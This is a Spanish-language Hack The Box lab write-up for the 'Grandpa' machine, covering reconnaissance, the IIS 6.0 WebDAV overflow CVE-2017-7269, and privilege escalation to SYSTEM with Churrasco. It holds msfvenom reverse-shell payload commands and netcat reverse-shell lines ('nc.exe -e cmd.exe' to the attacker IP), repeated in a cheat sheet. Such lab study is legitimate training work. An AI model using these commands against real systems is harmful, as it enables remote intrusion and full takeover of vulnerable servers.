[👴 Grandpa — HTB [Windows · Easy] 32715bd2d16c8035a947fe55e346060b.md](https://github.com/user-attachments/files/28265026/Grandpa.HTB.Windows.Easy.32715bd2d16c8035a947fe55e346060b.md)
# 👴 Grandpa — HTB [Windows · Easy]

> **Plataforma:** Hack The Box | **OS:** Windows Server 2003 x86 (IIS 6.0) | **Dificultad:** Easy | **CVEs:** CVE-2017-7269 (WebDAV Buffer Overflow) + SeImpersonatePrivilege (Churrasco)
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.10.10.14` |
| Foothold | IIS 6.0 WebDAV Buffer Overflow — CVE-2017-7269 |
| Acceso inicial | Shell como **nt authority\network service** |
| PrivEsc | SeImpersonatePrivilege → Churrasco.exe |
| Acceso final | **NT AUTHORITY\SYSTEM** |
| Transferencia | impacket-smbserver (certutil falló en Windows 2003) |

---

# 1. Reconocimiento

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oN grandpa_full.nmap 10.10.10.14
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK
|   Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
```

**Datos clave:**

- IIS 6.0 → Windows Server 2003, arquitectura **x86 (32 bits)**.
- Métodos WebDAV habilitados: `PROPFIND`, `COPY`, `LOCK` → superficie de ataque para CVE-2017-7269.
- `TRACE` habilitado → potencial XST pero no relevante aquí.

```bash
# Confirmar WebDAV y versión
davtest -url http://10.10.10.14
```

---

# 2. Foothold — CVE-2017-7269 (WebDAV Buffer Overflow)

## ¿Qué es la vulnerabilidad?

**CVE-2017-7269** es un desbordamiento de búfer en el componente **ScStoragePathFromUrl** de WebDAV en IIS 6.0. Al enviar una petición `PROPFIND` con una cabecera `If:` especialmente manipulada, se desborda el buffer del stack y se puede redirigir la ejecución a shellcode controlado por el atacante.

El exploit usa una cadena **ROP (Return-Oriented Programming)** — los famosos «caracteres chinos» que se ven en el script — para eludir DEP/NX y redirigir el flujo de ejecución al shellcode.

## Por qué el shellcode debe ser alfanumérico

WebDAV procesa la cabecera `If:` como una URL. Los bytes que no son caracteres URL-válidos (como muchos bytes de shellcode binario puro) son filtrados o modificados por el parser HTTP antes de llegar al buffer vulnerable. El encoder `x86/alpha_mixed` de msfvenom genera shellcode compuesto únicamente de caracteres alfanuméricos (A-Z, a-z, 0-9) que sobreviven intactos al paso por el parser.

## Generar el payload

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -b '\x00\x3a\x26\x3f\x25\x23\x20' \
  -e x86/alpha_mixed \
  -f raw \
  EXITFUNC=thread \
  -o shellcode.bin
```

> **Por qué `EXITFUNC=thread`:** El proceso de IIS es crítico para el servidor. Si el exploit mata el proceso (`EXITFUNC=process`), el servidor cae y pierdes acceso. Con `thread`, solo muere el hilo explotado y el proceso sigue vivo.
> 

## Ejecutar el exploit

```bash
# Listener primero
nc -lvnp 4444

# Exploit
python3 41738.py
# Editar el script para poner:
# - IP del target: 10.10.10.14
# - Tu IP tun0
# - Puerto listener
```

## Por qué el exploit era inestable (Connection Reset)

El Buffer Overflow corrompe la memoria del proceso IIS al explotar. Si el shellcode no conecta rápido al listener (porque el listener no estaba listo, o la conexión tardó), el proceso muere antes de establecer la shell y la conexión se resetea. La solución es:

1. Tener el listener activo ANTES de lanzar el exploit.
2. Si falla, resetear la máquina en HTB y reintentar con memoria limpia.

## Shell recibida

```
connect to [10.10.14.X] from (UNKNOWN) [10.10.10.14]
Microsoft Windows [Version 5.2.3790]

c:\windows\system32\inetsrv> whoami
nt authority\network service
```

---

# 3. Enumeración Post-Foothold

## Identificar arquitectura y privilegios

```bash
systeminfo
```

```
OS Name:    Microsoft Windows Server 2003 R2
OS Version: 5.2.3790 Service Pack 2 Build 3790
System Type: X86-based PC
```

**Windows Server 2003 x86** — sistema muy antiguo, sin parches modernos.

```bash
whoami /priv
```

```
Privilege Name                  State
=============================== ========
SeImpersonatePrivilege          Enabled   ← VECTOR CRÍTICO
SeAssignPrimaryTokenPrivilege   Disabled
```

**`SeImpersonatePrivilege` habilitado** — este es el vector de escalada. Cuando un proceso corre como `Network Service` o `Local Service` y tiene este privilegio, puede impersonar tokens de otros usuarios, incluyendo SYSTEM.

## Por qué certutil falló

```bash
certutil.exe -urlcache -split -f http://10.10.14.X/churrasco.exe C:\Windows\Temp\churrasco.exe
# → Error: 0x80070057 (The parameter is incorrect)
```

**Causa:** La sintaxis `-urlcache -split -f` de certutil para descarga HTTP es una funcionalidad añadida en versiones modernas. Windows Server 2003 tiene una versión antigua de certutil que no soporta esos parámetros. En sistemas muy antiguos, certutil existe pero para gestión de certificados solamente, no para descarga de archivos.

**Solución:** impacket-smbserver, que es nativo de Windows y funciona en cualquier versión.

---

# 4. Escalada de Privilegios — SeImpersonatePrivilege + Churrasco

## ¿Qué es SeImpersonatePrivilege?

Es un privilegio de Windows que permite a un proceso «impersonar» (hacerse pasar por) otro usuario usando su token de seguridad. Los procesos de servicios de red lo tienen habilitado porque necesitan actuar en nombre de usuarios para ciertas operaciones.

La explotación funciona creando un servidor COM/RPC local que atrae al servicio SYSTEM a conectarse, roba su token, y lo usa para ejecutar comandos con privilegios máximos.

## ¿Por qué Churrasco y no JuicyPotato/PrintSpoofer?

**JuicyPotato y PrintSpoofer** son exploits modernos de SeImpersonatePrivilege que funcionan en Windows 7+ / Server 2008+. **Windows Server 2003 es demasiado antiguo** para ellos — usan APIs y mecanismos COM que no existían en 2003.

**Churrasco** es la versión original y compatible con Windows 2003/XP. Mismo concepto, implementación adaptada al sistema antiguo.

| Sistema | Exploit SeImpersonate |
| --- | --- |
| XP / Server 2003 | **Churrasco.exe** |
| Vista / 7 / 2008 | JuicyPotato |
| Win10 / Server 2019+ | PrintSpoofer / GodPotato |

## Transferir con SMB

```bash
# En Kali — compartir carpeta actual
impacket-smbserver share . -smb2support
```

```bash
:: En la shell de network service
copy \\10.10.14.X\share\churrasco.exe C:\Windows\Temp\churrasco.exe
copy \\10.10.14.X\share\nc.exe C:\Windows\Temp\nc.exe
```

## Listener y ejecución

```bash
nc -lvnp 5555
```

```bash
C:\Windows\Temp\churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.X 5555"
```

## Shell SYSTEM recibida

```
connect to [10.10.14.X] from (UNKNOWN) [10.10.10.14]
Microsoft Windows [Version 5.2.3790]

C:\Windows\Temp> whoami
nt authority\system
```

---

# 5. Historial de Errores — Lo Que Falló y Por Qué

| # | Problema | Error | Causa raíz |
| --- | --- | --- | --- |
| 1 | Shellcode binario puro en WebDAV | Shell no conecta / exploit falla | WebDAV filtra bytes no-URL-válidos → usar encoder `x86/alpha_mixed` |
| 2 | Connection Reset al explotar | Servidor cierra conexión | Buffer Overflow corrompe memoria → listener listo antes, reiniciar si falla |
| 3 | certutil para transferir archivos | `Error: 0x80070057` | Windows 2003 tiene certutil antiguo sin soporte de descarga HTTP |
| 4 | Sherlock en sistema x86 muy antiguo | Falsos positivos | Sherlock puede no ser fiable en sistemas pre-Vista → verificar manualmente |
| 5 | JuicyPotato / PrintSpoofer | No compatibles | Requieren APIs modernas → usar Churrasco para Windows 2003/XP |
| ✅ | Churrasco + SMB transfer | **SYSTEM shell** | Exploit correcto para la era del OS + método de transferencia nativo |

---

# 6. Moralejas y Notas para el OSCP

## Moraleja 1 — `whoami /priv` es el primer comando tras cualquier foothold en Windows

El éxito en Grandpa no vino del exploit de Python sino de ejecutar `whoami /priv` y ver `SeImpersonatePrivilege: Enabled`. Sin esa enumeración, estarías lanzando kernel exploits al azar. En el OSCP, el primer movimiento tras cualquier shell Windows es siempre:

```bash
whoami
whoami /priv
systeminfo
```

Si ves `SeImpersonatePrivilege` habilitado, ya tienes el vector. No necesitas buscar más.

---

## Moraleja 2 — El encoder del shellcode debe sobrevivir al protocolo que lo transporta

Esta es la lección técnica más importante de Grandpa. No es solo «copiar y pegar» el shellcode. El protocolo WebDAV filtra bytes no alfanuméricos antes de que lleguen al buffer. Si el shellcode tiene esos bytes, llega corrupto y el exploit falla silenciosamente.

Regla para el OSCP: cuando el vector de entrega es HTTP/WebDAV/URL, usar siempre `x86/alpha_mixed` o `x86/alpha_upper`. Cuando es SMB o ejecución directa, el shellcode estándar funciona.

```bash
# Para exploits que viajan por HTTP/WebDAV
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 \
  -e x86/alpha_mixed -f raw EXITFUNC=thread -o shell.bin

# Para transferencia directa (SMB, FTP, disco)
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 \
  -f exe -o shell.exe
```

---

## Moraleja 3 — Conocer el árbol de herramientas de SeImpersonate por versión de Windows

SeImpersonatePrivilege es uno de los vectores más frecuentes del OSCP. La herramienta correcta depende del OS:

| OS | Herramienta |
| --- | --- |
| XP / Server 2003 | Churrasco |
| Vista / 7 / Server 2008 | JuicyPotato |
| Win10 / Server 2016+ | PrintSpoofer / GodPotato |

En el examen, identificar el OS correctamente antes de elegir la herramienta ahorra 30 minutos de frustración.

---

## Moraleja 4 — certutil no existe igual en todos los Windows

certutil es la herramienta de descarga favorita en Windows moderno, pero en sistemas legacy (Server 2003, XP) la versión de certutil no soporta descarga HTTP. El error `0x80070057` es la señal.

Plan B inmediato: `impacket-smbserver`. No depende de la versión del OS, es nativo de Windows y funciona siempre. Es el método de transferencia de fallback cuando certutil falla.

```bash
# En Kali
impacket-smbserver share . -smb2support

# En la víctima (cualquier Windows)
copy \\TU_IP\share\archivo.exe C:\Windows\Temp\
```

---

## Moraleja 5 — Buffer Overflow en servicios: memoria sucia = reiniciar

Los exploits de BoF corrompen la memoria del proceso al explotar. Si el exploit falla a mitad (listener no listo, conexión lenta, timing), el proceso queda con memoria en estado inconsistente. Los siguientes intentos fallarán aunque el exploit esté bien. La solución es reiniciar la máquina en HTB para limpiar el estado.

En el OSCP si un BoF «debería funcionar» y no lo hace, reiniciar antes de seguir depurando.

---

## Moraleja 6 — El patrón completo de Grandpa

```
nmap → IIS 6.0 + WebDAV → CVE-2017-7269
    ↓
msfvenom con x86/alpha_mixed (shellcode alfanumérico para WebDAV)
    ↓
listener listo → python3 41738.py → shell como network service
    ↓
whoami /priv → SeImpersonatePrivilege enabled
    ↓
certutil falla (Windows 2003) → impacket-smbserver
    ↓
Churrasco.exe (SeImpersonate para Win2003) + nc.exe → SYSTEM
```

---

# 7. Comandos Clave — Cheat Sheet

```bash
# Generar shellcode alfanumérico para WebDAV
msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=4444 \
  -b '\x00\x3a\x26\x3f\x25\x23\x20' \
  -e x86/alpha_mixed -f raw EXITFUNC=thread -o shellcode.bin

# Listener
nc -lvnp 4444

# Exploit (editar IPs en el script primero)
python3 41738.py

# Post-foothold — primer comando
whoami /priv

# Transferir con SMB cuando certutil falla
# Kali:
impacket-smbserver share . -smb2support
# Víctima:
copy \\TU_IP\share\churrasco.exe C:\Windows\Temp\
copy \\TU_IP\share\nc.exe C:\Windows\Temp\

# Listener para SYSTEM
nc -lvnp 5555

# Churrasco — SeImpersonate para Windows 2003
C:\Windows\Temp\churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe TU_IP 5555"
```

---

# 8. Flags

User.txt flag

![image.png](%F0%9F%91%B4%20Grandpa%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image.png)

root.txt

![image.png](%F0%9F%91%B4%20Grandpa%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image%201.png)

La máquina Grandpa presenta una superficie de ataque crítica debido a la ejecución de software heredado (legacy). Se identificó un servidor IIS 6.0 vulnerable a un desbordamiento de búfer en el componente WebDAV, permitiendo la ejecución remota de código (RCE). Tras el acceso inicial, se abusó de privilegios de personificación de tokens para elevar privilegios a SYSTEM.

1. Fase de Acceso Inicial (Vulnerabilidad: CVE-2017-7269)
Lo que salió mal (Errores y Aprendizaje):
Inestabilidad del Exploit (Connection Reset): Al usar el script original ([41738.py](http://41738.py/)), el servidor a menudo cerraba la conexión. Takeaway: Los exploits de Buffer Overflow en servicios web como IIS corrompen la memoria. Si el proceso muere antes de que la shell conecte, pierdes el acceso.

Filtros de Caracteres: El uso de shellcodes binarios puros fallaba porque WebDAV espera carácteres válidos en una URL.

Arquitectura: El servidor es de 32 bits (x86), lo que requiere shellcodes y exploits específicos para esa arquitectura.

Proceso Técnico:
Identificación: Escaneo de Nmap detectó el puerto 80 con Microsoft IIS httpd 6.0.

Generación de Payload: Se utilizó msfvenom con el encoder x86/alpha_mixed para asegurar que el shellcode fuera alfanumérico y compatible con la cabecera HTTP If:.

Explotación: Se ejecutó un script en Python que enviaba una petición PROPFIND maliciosa con una cadena ROP (los famosos carácteres "chinos") para redirigir el flujo de ejecución al shellcode.

Estabilización: Se obtuvo una shell como nt authority\network service.

1. Fase de Escalada de Privilegios (Vulnerabilidad: Token Impersonation)
Lo que salió mal (Errores y Aprendizaje):
Fallo de Herramientas Modernas (Certutil): Intentar usar certutil -urlcache falló con el error 0x80070057. Takeaway: En sistemas antiguos (Windows 2003), las herramientas nativas tienen sintaxis limitadas o no existen. Hay que dominar métodos alternativos como VBScript o SMB Transfer.

Sherlock vs Realidad: Sherlock puede dar falsos positivos en sistemas x86 tan antiguos.

Proceso Técnico:
Enumeración de Privilegios: El comando whoami /priv reveló que el privilegio SeImpersonatePrivilege estaba habilitado. Este es el vector crítico de escalada en servicios de red.

Transferencia de Archivos: Ante el fallo de certutil, se utilizó impacket-smbserver en la máquina atacante para compartir churrasco.exe y nc.exe. Se ejecutó el comando copy \\10.10.x.x\share\archivo.exe desde la víctima.

Ejecución del Exploit: Se utilizó Churrasco.exe, que aprovecha el privilegio de personificación para ejecutar un comando con el token de SYSTEM.

Comando: churrasco.exe -d "nc.exe -e cmd.exe 10.10.16.31 5555"

Confirmación: Se recibió una shell reversa con privilegios máximos: nt authority\system.

1. Lecciones Aprendidas (OSCP Mindset)
Enumera antes de actuar: El éxito no vino del exploit de Python, sino de identificar SeImpersonatePrivilege. Sin esa enumeración, estarías lanzando exploits al azar.

Adaptabilidad de Herramientas: Si certutil falla, no te bloquees. El protocolo SMB (copy) suele ser más fiable en entornos Windows antiguos.

Entender el Payload: No es solo "copiar y pegar". Entender que el shellcode debía ser alfanumérico (alpha_mixed) y que necesitaba el registro EAX fue la clave para que la shell conectara.

Persistencia y Reseteo: En máquinas con desbordamiento de búfer, el Reset de la máquina es una herramienta técnica más. Si la memoria está corrupta, ningún exploit funcionará hasta que el servicio se reinicie.

1. Recomendaciones de Remediación
Actualización de Sistema: Windows Server 2003 es un sistema al final de su vida útil (EOL) y debe ser reemplazado.

Deshabilitar WebDAV: Si no es estrictamente necesario, el servicio WebDAV debe ser desactivado en IIS.

Principio de Menor Privilegio: Los servicios de red no deberían ejecutarse con privilegios que permitan SeImpersonatePrivilege.
